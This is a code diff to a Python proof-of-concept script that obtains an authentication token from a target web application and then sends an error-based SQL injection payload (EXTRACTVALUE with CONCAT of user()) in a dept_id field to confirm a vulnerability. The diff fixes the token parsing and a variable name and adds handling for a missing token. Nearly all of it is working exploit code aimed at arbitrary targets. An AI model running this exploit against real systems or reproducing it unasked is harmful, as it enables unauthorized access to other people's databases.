@@ -24,18 +24,17 @@ def get_token(target):
 
     try:
         token_resp = requests.post(
-            target + token_url, headers=headers, data=req_data, verify=False, timeout=30
+            target + token_url, headers=headers, data=token_data, verify=False, timeout=30
         )
         if (
             token_resp.status_code == 200
             and '{"status":1' in token_resp.text
             and '"err_code":0' in token_resp.text
         ):
-            authen = token_resp.json["authen"]
+            authen = token_resp.json()['data']['authen']
             return authen
         else:
-            print("No Vuln")
-            exit(1)
+            print(f"{target} 未获取到token")   
     except RequestException as e:
         print(e)
 
@@ -47,22 +46,21 @@ def check(target):
         target = f"http://{target}"
 
     authen = get_token(target)
-
-    sqli_data = {
-        "authen": f"{authen}",
-        "uid": "1",
-        "dept_id": "1' AND EXTRACTVALUE(1, CONCAT(0x7e, user(), 0x7e)) AND 'a'='a",
-        "taget_parentdept_id": "123",
-    }
-
-    try:
-        sqli_resp = requests.post(
-            target + sqli_url, headers=headers, data=sqli_data, verify=False, timeout=30
-        )
-        if "~root@localhost~" in sqli_resp.text:
-            print(f"{target} 存在漏洞")
-    except RequestException as e:
-        print(e)
+    if authen:
+        sqli_data = {
+            "authen": f"{authen}",
+            "uid": "1",
+            "dept_id": "1' AND EXTRACTVALUE(1, CONCAT(0x7e, user(), 0x7e)) AND 'a'='a",
+            "taget_parentdept_id": "123",
+        }
+        try:
+            sqli_resp = requests.post(
+                target + sqli_url, headers=headers, data=sqli_data, verify=False, timeout=30
+            )
+            if "~root@localhost~" in sqli_resp.text:
+                print(f"{target} 存在漏洞")
+        except RequestException as e:
+            print(e)
 
 
 def main(args):
